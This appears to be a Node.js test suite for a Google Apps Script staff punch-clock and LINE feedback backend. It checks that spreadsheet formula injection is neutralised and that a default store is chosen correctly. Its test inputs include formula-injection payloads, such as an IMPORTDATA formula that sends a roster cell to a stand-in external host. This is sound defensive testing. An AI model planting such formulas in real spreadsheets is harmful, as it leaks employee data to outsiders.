// 2026-10-29 審查修正：①「建議：」寫進 feedback 前把 = + - @ 開頭換全形 ②申請頁開頁回 punch_store（最近一張卡的店）
// ③舊 clock 動作只收 in／out、device_id 開頭的公式字元換全形
const assert = require('assert'); const fs = require('fs'); const vm = require('vm');
const ROOT = __dirname + '/..';
const SRC = ['Liff.gs', 'LineHub.gs'].map(f => fs.readFileSync(ROOT + '/apps-script/' + f, 'utf8')).join('\n');
let n = 0; const ok = (name, fn) => { fn(); n++; console.log('✓ ' + name); };

function hub() {
  const cache = {}, appended = [];
  const sb = { console, JSON, Math, String, Number, Date, Object, Array, parseInt, isFinite, isNaN, RegExp,
    CacheService: { getScriptCache: () => ({ get: (k) => cache[k] || null, put: (k, v) => { cache[k] = v; }, remove: (k) => { delete cache[k]; }, removeAll() {} }) },
    Utilities: { formatDate: () => '2026-10-29' },
    LEAVE_TYPES: ['特休假', '事假', '病假'],
    nowTaipeiIso: () => '2026-10-29T12:00:00+08:00', normCellTs: (v) => String(v),
  };
  vm.createContext(sb); vm.runInContext(SRC, sb);
  const fb = { appendRow: (r) => appended.push(r), getRange: () => ({ setValues() {} }) };
  sb.getSS = () => ({ getSheetByName: (nm) => (nm === 'feedback' ? fb : null), insertSheet: () => fb });
  sb.verifyLineIdToken_ = (t) => (t ? 'U1' : null);
  sb.lineHubThrottled_ = () => false;
  sb.lineHubPayPick_ = () => null; sb.payLeaveTypes = () => []; sb.lineHubPayslipFor_ = () => null;
  sb.__appended = appended;
  return sb;
}
const GF = { code: '', name: '小辛辣 新竹光復' }, JS = { code: 'mztjs', name: '金山' };
const ev = (ts, emp, status) => ({ ts, emp_id: emp, type: 'in', status: status || 'ok' });

ok('建議：= + - @ 開頭換全形，一般文字不動', () => {
  const sb = hub();
  sb.lineHubMine_ = () => [];   // 沒綁定的好友也能送
  sb.lineHubFeedback_('U9', '=IMPORTDATA("https://x/?d="&roster!C2)');
  sb.lineHubFeedback_('U9', '@HYPERLINK("x")');
  sb.lineHubFeedback_('U9', '冷氣太冷');
  assert.deepStrictEqual(sb.__appended.map((r) => r[4]), ['＝IMPORTDATA("https://x/?d="&roster!C2)', '＠HYPERLINK("x")', '冷氣太冷']);
});

function initWith(mine, rowsByCode) {
  const sb = hub();
  sb.lineHubMine_ = () => mine;
  sb.lineHubSS_ = (st) => ({ code: st.code });
  sb.lineHubTailRows_ = (ss) => { if (rowsByCode[ss.code] === 'boom') throw new Error('讀不到'); return rowsByCode[ss.code] || []; };
  return sb.handleLineHubReqInit_({ id_token: 't' });
}
ok('申請頁預設店別：綁兩家 → 回最近一張卡的店（被擋的卡不算）', () => {
  const mine = [{ st: GF, row: { emp_id: 'E1' } }, { st: JS, row: { emp_id: 'J7' } }];
  let r = initWith(mine, { '': [ev('2026-10-27T10:00:00+08:00', 'E1')], mztjs: [ev('2026-10-28T17:00:00+08:00', 'J7')] });
  assert.strictEqual(r.punch_store, 'mztjs');
  r = initWith(mine, { '': [ev('2026-10-28T09:00:00+08:00', 'E1')], mztjs: [ev('2026-10-27T17:00:00+08:00', 'J7')] });
  assert.strictEqual(r.punch_store, '');   // 光復代碼是空字串，不能被當成「沒有」
  r = initWith(mine, { '': [ev('2026-10-27T10:00:00+08:00', 'E1')], mztjs: [ev('2026-10-28T17:00:00+08:00', 'J7', 'rejected_out_of_range')] });
  assert.strictEqual(r.punch_store, '');
  r = initWith(mine, { '': [ev('2026-10-28T10:00:00+08:00', 'E9')], mztjs: [] });   // 別人的卡不算
  assert.strictEqual(r.punch_store, null);
});
ok('申請頁預設店別：某家讀不到就看其他家；只綁一家不讀 events', () => {
  const mine = [{ st: GF, row: { emp_id: 'E1' } }, { st: JS, row: { emp_id: 'J7' } }];
  assert.strictEqual(initWith(mine, { '': 'boom', mztjs: [ev('2026-10-20T17:00:00+08:00', 'J7')] }).punch_store, 'mztjs');
  const r = initWith([{ st: GF, row: { emp_id: 'E1' } }], { '': 'boom' });
  assert(r.ok); assert.strictEqual(r.punch_store, null);
});

ok('舊 clock 動作：type 只收 in／out；device_id 開頭的公式字元換全形', () => {
  const C = fs.readFileSync(ROOT + '/apps-script/Code.gs', 'utf8');
  const sb = { console, JSON, Math, String, Number, Date, Object, Array, parseInt, parseFloat, isFinite, isNaN, RegExp,
    SpreadsheetApp: { getActive: () => null }, PropertiesService: { getScriptProperties: () => ({ getProperty: () => null }) },
    Logger: { log() {} } };
  vm.createContext(sb); vm.runInContext(C, sb);
  sb.nowTaipeiIso = () => '2026-10-29T12:00:00+08:00';
  const roster = [{ emp_id: 'E1', key: 'k1', active: 'true', device_id: '', __rowIndex: 2 }];
  const written = [];
  const fakeSheet = { getRange: () => ({ setValue: (v) => written.push(v), setValues() {} }), appendRow: (r) => written.push(r) };
  sb.getSS = () => ({ getSheetByName: () => fakeSheet });
  sb.readEventsSince = () => ({ headers: ['ts', 'accuracy_m'], rows: [] });
  sb.refreshCurrentMonthSafe = () => {}; sb.refreshCurrentMonth = () => {};
  const call = (b) => sb.handleClock(Object.assign({ key: 'k1', lat: 24.78, lng: 121.01, accuracy: 10 }, b), null, roster);
  assert.strictEqual(call({ type: '=HYPERLINK("x")', device_id: 'd' }).error, 'bad_type');
  assert.strictEqual(written.length, 0);
  call({ type: 'in', device_id: '=IMPORTRANGE("x")' });
  assert.strictEqual(written[0], '＝IMPORTRANGE("x")');   // 名冊 device_id 那格
  assert(written.some((w) => Array.isArray(w) && w[7] === '＝IMPORTRANGE("x")'));   // events 那列
});

if (require.main === module) console.log(`\n${n} 項全部通過`);
